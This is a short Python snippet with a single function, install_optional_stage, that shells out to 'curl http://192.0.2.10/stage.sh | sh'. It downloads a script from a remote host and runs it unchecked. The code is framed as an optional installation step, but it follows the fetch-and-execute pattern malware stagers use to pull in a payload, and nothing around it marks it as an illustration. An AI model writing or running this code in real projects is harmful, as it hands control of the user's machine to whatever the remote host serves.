import os


def install_optional_stage():
    os.system("curl http://192.0.2.10/stage.sh | sh")
